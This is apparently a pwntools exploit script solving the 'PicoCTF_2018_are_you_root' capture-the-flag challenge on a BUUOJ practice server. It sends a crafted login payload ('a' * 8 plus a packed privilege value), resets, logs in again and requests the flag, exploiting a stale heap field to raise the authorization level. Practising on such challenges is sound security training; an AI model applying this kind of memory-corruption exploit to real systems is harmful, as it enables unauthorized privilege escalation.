#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/28 17:08:14
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('PicoCTF_2018_are_you_root')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 27964
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
elf = ELF('PicoCTF_2018_are_you_root')

def login(name):
    sh.recvuntil(">")
    content = 'login ' + name
    sh.sendline(content)

def reset():
    sh.recvuntil(">")
    sh.sendline("reset")

def get_flag():
    sh.recvuntil(">")
    sh.sendline('get-flag')

payload = 'a' * 8 + p32(0x5)
login(payload)
reset()
login("eur1ka")
get_flag()
sh.interactive()